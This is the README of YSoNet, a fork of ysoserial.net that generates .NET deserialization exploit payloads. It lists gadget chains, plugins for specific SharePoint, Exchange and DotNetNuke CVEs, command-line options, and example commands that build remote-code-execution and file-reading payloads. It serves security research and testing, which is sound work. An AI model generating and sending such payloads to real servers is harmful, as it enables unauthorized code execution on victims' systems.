<img src="/logo.png" alt="logo" width="200" />

**YSoNet** is a fork of the original [YSoSerial.Net](https://github.com/pwntester/ysoserial.net), currently maintained by [@irsdl](https://github.com/irsdl).

* Visit: [https://ysonet.net](https://ysonet.net)
* This is the **initial version**. The README, links, and build process will gradually evolve to distinguish it from the original project.

---
[![Build](https://github.com/irsdl/ysonet/actions/workflows/build.yml/badge.svg)](https://github.com/irsdl/ysonet/actions/workflows/build.yml)
[![License](https://img.shields.io/github/license/irsdl/ysonet)](https://github.com/irsdl/ysonet/blob/master/LICENSE)
[![Download](https://img.shields.io/github/v/release/irsdl/ysonet?label=download)](https://github.com/irsdl/ysonet/releases/latest)

A proof-of-concept tool for generating payloads that exploit unsafe .NET object deserialization.

## Description
YSoNet (previously known as ysoserial.net) is a collection of utilities and property-oriented programming "gadget chains" discovered in common .NET libraries that can, under the right conditions, exploit .NET applications performing unsafe deserialization of objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having gadgets on the classpath.

This project is inspired by [Chris Frohoff's ysoserial project](https://github.com/frohoff/ysoserial)

## Disclaimer 
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.

This software is a personal project and not related to any companies, including the project owner’s and contributors’ employers.

## Installation
In order to obtain the latest version, it is recommended to download it from [the Actions page](https://github.com/irsdl/ysonet/actions).

You can install the previous releases of YSoSerial.NET from [the releases page](https://github.com/pwntester/ysoserial.net/releases)

## Build from source

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

choco install visualstudio2022community --yes
choco install visualstudio2022-workload-nativedesktop --yes
choco install choco install msbuild.communitytasks --yes
choco install nuget.commandline --yes
choco install git --yes

git clone https://github.com/irsdl/ysonet
cd ysonet
nuget restore ysonet.sln
msbuild ysonet.sln -p:Configuration=Release

.\ysonet\bin\Release\ysonet.exe -h
```

## Usage
Use `ysonet.exe --fullhelp` to see more details. You can also see different gadgets’ or plugins’ help using:
    * `ysonet.exe -g NameHere -help`
    * `ysonet.exe -p NameHere -help`
	
```
$ ./ysonet.exe --help
== GADGETS ==
        (*) ActivitySurrogateDisableTypeCheck (BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter)
        (*) ActivitySurrogateSelector (BinaryFormatter (2), LosFormatter, SoapFormatter)
        (*) ActivitySurrogateSelectorFromFile (BinaryFormatter (2), LosFormatter, SoapFormatter)
        (*) AxHostState (BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter)
        (*) BaseActivationFactory (Json.NET)
        (*) ClaimsIdentity (BinaryFormatter, LosFormatter, SoapFormatter)
        (*) ClaimsPrincipal (BinaryFormatter, LosFormatter, SoapFormatter)
        (*) DataSet (BinaryFormatter, LosFormatter, SoapFormatter)
        (*) DataSetOldBehaviour (BinaryFormatter, LosFormatter)
        (*) DataSetOldBehaviourFromFile (BinaryFormatter, LosFormatter)
        (*) DataSetTypeSpoof (BinaryFormatter, LosFormatter, SoapFormatter)
        (*) GenericPrincipal (BinaryFormatter, LosFormatter)
        (*) GetterCompilerResults (Json.NET)
        (*) GetterSecurityException (Json.NET)
        (*) GetterSettingsPropertyValue (Json.NET, MessagePackTypeless, MessagePackTypelessLz4, Xaml)
        (*) ObjectDataProvider (DataContractSerializer (2), FastJson, FsPickler, JavaScriptSerializer, Json.NET, MessagePackTypeless, MessagePackTypelessLz4, SharpSerializerBinary, SharpSerializerXml, Xaml (4), XmlSerializer (2), YamlDotNet < 5.0.0)
        (*) ObjRef (BinaryFormatter, LosFormatter, ObjectStateFormatter, SoapFormatter)
        (*) PSObject (BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter)
        (*) RolePrincipal (BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter)
        (*) SessionSecurityToken (BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter)
        (*) SessionViewStateHistoryItem (BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter)
        (*) TextFormattingRunProperties (BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter)
        (*) ToolboxItemContainer (BinaryFormatter, LosFormatter, SoapFormatter)
        (*) TypeConfuseDelegate (BinaryFormatter, LosFormatter, NetDataContractSerializer)
        (*) TypeConfuseDelegateMono (BinaryFormatter, LosFormatter, NetDataContractSerializer)
        (*) WindowsClaimsIdentity (BinaryFormatter (3), DataContractSerializer (2), Json.NET (2), LosFormatter (3), NetDataContractSerializer (3), SoapFormatter (2))
        (*) WindowsIdentity (BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter)
        (*) WindowsPrincipal (BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter)
        (*) XamlAssemblyLoadFromFile (BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter)
        (*) XamlImageInfo (Json.NET)

== PLUGINS ==
        (*) ActivatorUrl (Sends a generated payload to an activated, presumably remote, object)
        (*) Altserialization (Generates payload for HttpStaticObjectsCollection or SessionStateItemCollection)
        (*) ApplicationTrust (Generates XML payload for the ApplicationTrust class)
        (*) Clipboard (Generates payload for DataObject and copies it into the clipboard - ready to be pasted in affected apps)
        (*) DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)
        (*) GetterCallGadgets (Implements arbitrary getter call gadgets for .NET Framework and .NET 5/6/7 with WPF enabled, run with -l for more help)
        (*) MachineKeySessionSecurityTokenHandler (Generates XML payload for the MachineKeySessionSecurityTokenHandler class)
        (*) NetNonRceGadgets (Implements Non-RCE gadgets for .NET Framework)
        (*) Resx (Generates RESX and .RESOURCES files)
        (*) SessionSecurityTokenHandler (Generates XML payload for the SessionSecurityTokenHandler class)
        (*) SharePoint (Generates payloads for the following SharePoint CVEs: CVE-2025-49704, CVE-2024-38018, CVE-2020-1147, CVE-2019-0604, CVE-2018-8421)
        (*) ThirdPartyGadgets (Implements gadgets for 3rd Party Libraries)
        (*) TransactionManagerReenlist (Generates payload for the TransactionManager.Reenlist method)
        (*) ViewState (Generates a ViewState using known MachineKey parameters)

Note: Machine authentication code (MAC) key modifier is not being used for LosFormatter in ysonet.net. Therefore, LosFormatter (base64 encoded) can be used to create ObjectStateFormatter payloads.

Usage: ysonet.exe [options]
Options:
  -p, --plugin=VALUE         The plugin to be used.
  -o, --output=VALUE         The output format (raw|base64|raw-
                               urlencode|base64-urlencode|hex).
  -g, --gadget=VALUE         The gadget chain.
  -f, --formatter=VALUE      The formatter.
  -c, --command=VALUE        The command to be executed.
      --rawcmd               Command will be executed as is without `cmd /c `
                               being appended (anything after first space is an
                               argument).
  -s, --stdin                The command to be executed will be read from
                               standard input.
      --bgc, --bridgedgadgetchains=VALUE
                             Chain of bridged gadgets separated by comma (,).
                               Each gadget will be used to complete the next
                               bridge gadget. The last one will be used in the
                               requested gadget. This will be ignored when
                               using the searchformatter argument.
  -t, --test                 Whether to run payload locally. Default: false
      --outputpath=VALUE     The output file path. It will be ignored if
                               empty.
      --minify               Whether to minify the payloads where applicable.
                               Default: false
      --ust, --usesimpletype This is to remove additional info only when
                               minifying and FormatterAssemblyStyle=Simple
                               (always `true` with `--minify` for binary
                               formatters). Default: true
      --raf, --runallformatters
                             Whether to run all the gadgets with the provided
                               formatter (ignores gadget name, output format,
                               and the test flag arguments). This will search
                               in formatters and also show the displayed
                               payload length. Default: false
      --sf, --searchformatter=VALUE
                             Search in all formatters to show relevant
                               gadgets and their formatters (other parameters
                               will be ignored).
      --debugmode            Enable debugging to show exception errors and
                               output length
  -h, --help                 Shows this message and exit.
      --fullhelp             Shows this message + extra options for gadgets
                               and plugins and exit.
      --credit               Shows the credit/history of gadgets and plugins
                               (other parameters will be ignored).
      --runmytest            Runs that `Start` method of `TestingArenaHome` -
                               useful for testing and debugging.
```

*Note:* When specifying complex commands, it can be tedious to escape some special character (;, |, &, ..). Use stdin option (-s) to read the command from stdin:

```
cat my_long_cmd.txt | ysonet.exe -o raw -g WindowsIdentity -f Json.Net -s
```

*Note:* XmlSerializer and DataContractSerializer formatters generate a wrapper Xml format including the expected type on the "type" attribute of the root node, as used, for example, in DotNetNuke. You may need to modify the generated xml based on how XmlSerializer gets the expected type in your case.

## Plugins
YSoNet can be used to generate raw payloads or more complex ones using a plugin architecture. To use plugins, use `-p <plugin name>` followed by the plugin options (the rest of ysonet options will be ignored). Eg:

```
$ ./ysonet.exe -p DotNetNuke -m read_file -f win.ini
```

For more help on plugin options use `-h` along with `-p <plugin name>`. Eg:

```
$ ./ysonet.exe -h -p DotNetNuke

ysonet generates deserialization payloads for a variety of .NET formatters.

Plugin:

DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)

Options:

  -m, --mode=VALUE           the payload mode: read_file, write_file, run_command.
  -c, --command=VALUE        the command to be executed in run_command mode.
  -u, --url=VALUE            the url to fetch the file from in write_file mode.
  -f, --file=VALUE           the file to read in read_file mode or the file to write to in write_file_mode.
      --minify               Whether to minify the payloads where applicable (experimental). Default: false
      --ust, --usesimpletype This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true
```

## Examples

### Generate a **calc.exe** payload for Json.Net using *ObjectDataProvider* gadget.
```
$ ./ysonet.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
```

### Generate a **calc.exe** payload for BinaryFormatter using *PSObject* gadget.
```
$ ./ysonet.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

### Generate a run_command payload for DotNetNuke using its plugin
```
$ ./ysonet.exe -p DotNetNuke -m run_command -c calc.exe
```

### Generate a read_file payload for DotNetNuke using its plugin
```
$ ./ysonet.exe -p DotNetNuke -m read_file -f win.ini
```

### Generate a minified BinaryFormatter payload to exploit Exchange CVE-2021-42321 using the ActivitySurrogateDisableTypeCheck gadget inside the ClaimsPrincipal gadget.
```
$ ./ysonet.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateDisableTypeCheck --minify --ust
```

## v2 Branch
v2 branch is a copy of ysoserial.net (15/03/2018) that has been changed to work with .NET Framework 2.0 by [irsdl](https://github.com/irsdl). Although this project can be used with applications that use .NET Framework v2.0, it also requires .NET Framework 3.5 to be installed on the target box as the gadgets depend on it. This problem will be resolved if new gadgets in .NET Framework 2.0 are identified in the future.

## Contributing to ysonet

**Canonical repository:** `https://github.com/irsdl/ysonet`
1. Fork **this** repo (irsdl/ysonet) to your account.
2. Create a branch from `master`.
3. Push your branch to *your fork*.
4. Open a PR to **irsdl/ysonet:master** using this link (replace `YOUR_USER` and `YOUR_BRANCH`):

   https://github.com/irsdl/ysonet/compare/master...YOUR_USER:ysonet:YOUR_BRANCH

5. For breaking changes, add the label **`major`** to the PR.

## Thanks
Special thanks to all contributors:
- [Oleksandr Mirosh](https://twitter.com/olekmirosh)
- [irsdl](https://github.com/irsdl)
- [JarLob](https://github.com/JarLob)
- [DS-Kurt-Boberg](https://github.com/DS-Kurt-Boberg)
- [mwulftange](https://github.com/mwulftange)
- [yallie](https://github.com/yallie)
- [paralax](https://github.com/paralax)

## Credits
```
$ ./ysonet.exe --credit

YSoNet tool is being developed and maintained by Soroush Dalili (@irsdl)
YSoSerial.Net has been originally developed by Alvaro Muñoz (@pwntester)

Credits for available gadgets:
        ActivitySurrogateDisableTypeCheck
                [Finders: Nick Landers]
        ActivitySurrogateSelector
                [Finders: James Forshaw] [Contributors: Alvaro Munoz, zcgonvh]
        ActivitySurrogateSelectorFromFile
                [Finders: James Forshaw] [Contributors: Alvaro Munoz, zcgonvh]
        AxHostState
                [Finders: Soroush Dalili]
        BaseActivationFactory
                [Finders: Piotr Bazydlo]
        ClaimsIdentity
                [Finders: Soroush Dalili]
        ClaimsPrincipal
                [Finders: jang]
        DataSet
                [Finders: James Forshaw] [Contributors: Soroush Dalili]
        DataSetOldBehaviour
                [Finders: Steven Seeley, Markus Wulftange, Khoa Dinh] [Contributors: Soroush Dalili]
        DataSetOldBehaviourFromFile
                [Finders: Steven Seeley, Markus Wulftange, Khoa Dinh] [Contributors: Soroush Dalili]
        DataSetTypeSpoof
                [Finders: James Forshaw] [Contributors: Soroush Dalili, Markus Wulftange, Jang]
        GenericPrincipal
                [Finders: Soroush Dalili]
        GetterCompilerResults
                [Finders: Piotr Bazydlo]
        GetterSecurityException
                [Finders: Piotr Bazydlo]
        GetterSettingsPropertyValue
                [Finders: Piotr Bazydlo]
        ObjectDataProvider
                [Finders: Oleksandr Mirosh, Alvaro Munoz] [Contributors: Alvaro Munoz, Soroush Dalili, Dane Evans]
        ObjRef
                [Finders: Markus Wulftange]
        PSObject
                [Finders: Oleksandr Mirosh, Alvaro Munoz] [Contributors: Alvaro Munoz]
        ResourceSet
                [Finders: Soroush Dalili]
        RolePrincipal
                [Finders: Soroush Dalili]
        SessionSecurityToken
                [Finders: @mufinnnnnnn, Soroush Dalili] [Contributors: Soroush Dalili]
        SessionViewStateHistoryItem
                [Finders: Soroush Dalili]
        TextFormattingRunProperties
                [Finders: Oleksandr Mirosh and Alvaro Munoz] [Contributors: Oleksandr Mirosh, Soroush Dalili, Piotr Bazydlo]
        ToolboxItemContainer
                [Finders: @frycos]
        TypeConfuseDelegate
                [Finders: James Forshaw] [Contributors: Alvaro Munoz]
        TypeConfuseDelegateMono
                [Finders: James Forshaw] [Contributors: Denis Andzakovic, Soroush Dalili]
        WindowsClaimsIdentity
                [Finders: Soroush Dalili]
        WindowsIdentity
                [Finders: Levi Broderick] [Contributors: Alvaro Munoz, Soroush Dalili]
        WindowsPrincipal
                [Finders: Steven Seeley of Qihoo 360 Vulcan Team] [Contributors: Chris Anastasio]
        XamlAssemblyLoadFromFile
                [Finders: Soroush Dalili] [Contributors: russtone]
        XamlImageInfo
                [Finders: Piotr Bazydlo]

Credits for available plugins:
        ActivatorUrl
                Harrison Neal
        Altserialization
                Soroush Dalili
        ApplicationTrust
                Soroush Dalili
        Clipboard
                Soroush Dalili
        DotNetNuke
                discovered by Oleksandr Mirosh and Alvaro Munoz, implemented by Alvaro Munoz, tested by @GlitchWitch
        GetterCallGadgets
                Piotr Bazydlo
        MachineKeySessionSecurityTokenHandler
                L@2uR1te
        NetNonRceGadgets
                Piotr Bazydlo
        Resx
                Soroush Dalili
        SessionSecurityTokenHandler
                Soroush Dalili
        SharePoint
                CVE-2024-38018: Piotr Bazydlo - explained by Khoa Dinh & implemented by Soroush Dalili, CVE-2025-49704: Khoa Dinh - implemented by Soroush Dalili, CVE-2018-8421: Soroush Dalili, CVE-2019-0604: Markus Wulftange, CVE-2020-1147: Oleksandr Mirosh, Markus Wulftange, Jonathan Birch, Steven Seeley (write-up)  - implemented by Soroush Dalili
        ThirdPartyGadgets
                Piotr Bazydlo
        TransactionManagerReenlist
                Soroush Dalili
        ViewState
                Soroush Dalili

Various other people have also donated their time and contributed to this project.
Please see https://github.com/pwntester/ysonet.net/graphs/contributors to find those who have helped developing more features or have fixed bugs.
```

## Additional Reading
- [Attacking .NET serialization](https://speakerdeck.com/pwntester/attacking-net-serialization)
- [Friday the 13th: JSON Attacks - Slides](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [Friday the 13th: JSON Attacks - Whitepaper](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
- [Friday the 13th: JSON Attacks - Video(demos)](https://www.youtube.com/watch?v=ZBfBYoK_Wr0)
- [Are you my Type? - Slides](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf)
- [Are you my Type? - Whitepaper](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [Exploiting .NET Managed DCOM](https://googleprojectzero.blogspot.com.es/2017/04/exploiting-net-managed-dcom.html)
- [Exploit Remoting Service ](https://github.com/tyranid/ExploitRemotingService)
- [Finding and Exploiting .NET Remoting over HTTP using Deserialisation](https://web.archive.org/web/20190330065542/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/)
- [.NET Remoting Revisited](https://codewhitesec.blogspot.com/2022/01/dotnet-remoting-revisited.html)
- [Bypassing .NET Serialization Binders](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)
- [Exploiting Hardened .NET Deserialization: New Exploitation Ideas and Abuse of Insecure Serialization -  Hexacon 2023 Whitepaper](https://github.com/thezdi/presentations/blob/main/2023_Hexacon/whitepaper-net-deser.pdf)

## ysoserial.net references in the wild

### Research:
- https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html
- https://web.archive.org/web/20190401191940/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/december/beware-of-deserialisation-in-.net-methods-and-classes-code-execution-via-paste/
- https://web.archive.org/web/20190330065542/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/
- https://web.archive.org/web/20180903005001/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/august/aspnet-resource-files-resx-and-deserialisation-issues/
- https://web.archive.org/web/20191210003556/https://www.nccgroup.trust/uk/our-research/use-of-deserialisation-in-.net-framework-methods-and-classes/
- https://community.microfocus.com/t5/Security-Research-Blog/New-NET-deserialization-gadget-for-compact-payload-When-size/ba-p/1763282
- https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/
- https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817
- https://research.nccgroup.com/2019/08/23/getting-shell-with-xamlx-files/
- https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/
- https://www.mdsec.co.uk/2020/04/introducing-ysoserial-net-april-2020-improvements/
- https://www.netspi.com/blog/technical/adversary-simulation/re-animating-activitysurrogateselector/
- https://blog.netwrix.com/2023/04/10/generating-deserialization-payloads-for-messagepack-cs-typeless-mode/
- https://code-white.com/blog/leaking-objrefs-to-exploit-http-dotnet-remoting/
- https://code-white.com/blog/teaching-the-old-net-remoting-new-exploitation-tricks/

### Usage:
- https://cert.360.cn/warning/detail?id=e689288863456481733e01b093c986b6
- https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-014/-cyberark-password-vault-web-access-remote-code-execution
- https://labs.mwrinfosecurity.com/advisories/milestone-xprotect-net-deserialization-vulnerability/
- https://soroush.secproject.com/blog/2018/12/story-of-two-published-rces-in-sharepoint-workflows/
- https://srcincite.io/blog/2018/08/31/you-cant-contain-me-analyzing-and-exploiting-an-elevation-of-privilege-in-docker-for-windows.html
- https://www.zerodayinitiative.com/blog/2018/8/14/voicemail-vandalism-getting-remote-code-execution-on-microsoft-exchange-server
- https://www.synacktiv.com/ressources/advisories/Sitecore_CSRF_deserialize_RCE.pdf
- https://www.zerodayinitiative.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability
- https://www.zerodayinitiative.com/blog/2019/10/23/cve-2019-1306-are-you-my-index
- https://labs.withsecure.com/blog/autocad-designing-a-kill-chain/
- https://www.nccgroup.trust/uk/our-research/technical-advisory-multiple-vulnerabilities-in-smartermail/
- https://www.nccgroup.trust/uk/our-research/technical-advisory-code-execution-by-viewing-resource-files-in-net-reflector/
- https://blog.devsecurity.eu/en/blog/dnspy-deserialization-vulnerability
- https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/
- https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys
- https://www.thezdi.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters
- https://www.mdsec.co.uk/2020/05/analysis-of-cve-2020-0605-code-execution-using-xps-files-in-net/
- https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html
- https://srcincite.io/pocs/cve-2020-16952.py.txt
- https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters
- https://www.modzero.com/modlog/archives/2020/06/16/mz-20-03_-_new_security_advisory_regarding_vulnerabilities_in__net/index.html
- https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys
- https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability
- https://blog.liquidsec.net/2021/06/01/asp-net-cryptography-for-pentesters/
- https://peterjson.medium.com/some-notes-about-microsoft-exchange-deserialization-rce-cve-2021-42321-110d04e8852
- https://www.mdsec.co.uk/2021/09/nsa-meeting-proposal-for-proxyshell/
- https://medium.com/@frycos/searching-for-deserialization-protection-bypasses-in-microsoft-exchange-cve-2022-21969-bfa38f63a62d
- https://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint
- https://blog.assetnote.io/2021/11/02/sitecore-rce/
- https://web.archive.org/web/20220619183339/https://starlabs.sg/blog/2022/05/new-wine-in-old-bottle-microsoft-sharepoint-post-auth-deserialization-rce-cve-2022-29108/
- https://gmo-cybersecurity.com/blog/net-remoting-english/
- https://www.mdsec.co.uk/2022/03/abc-code-execution-for-veeam/
- https://www.mandiant.com/resources/hunting-deserialization-exploits
- https://mogwailabs.de/en/blog/2022/01/vulnerability-spotlight-rce-in-ajax.net-professional/
- https://testbnull.medium.com/some-notes-of-microsoft-exchange-deserialization-rce-cve-2021-42321-f6750243cdcd
- https://testbnull.medium.com/note-nhanh-v%E1%BB%81-binaryformatter-binder-v%C3%A0-cve-2022-23277-6510d469604c
- https://www.zerodayinitiative.com/blog/2023/9/21/finding-deserialization-bugs-in-the-solarwind-platform
- https://www.youtube.com/watch?v=ZcOZNAmKR0c&feature=youtu.be

### Talks:
- https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf
- https://speakerdeck.com/pwntester/attacking-net-serialization
- https://speakerdeck.com/pwntester/dot-net-serialization-detecting-and-defending-vulnerable-endpoints
- https://gosecure.github.io/presentations/2018-03-18-confoo_mtl/Security_boot_camp_for_.NET_developers_Confoo_v2.pdf
- https://illuminopi.com/assets/files/BSidesIowa_RCEvil.net_20190420.pdf
- https://nullcon.net/website/archives/pdf/goa-2018/rohit-slides.pdf

### Tools:
- https://github.com/pwntester/ViewStatePayloadGenerator
- https://github.com/0xACB/viewgen
- https://github.com/Illuminopi/RCEvil.NET

### CTF write-ups:
- https://cyku.tw/ctf-hitcon-2018-why-so-serials/
- https://xz.aliyun.com/t/3019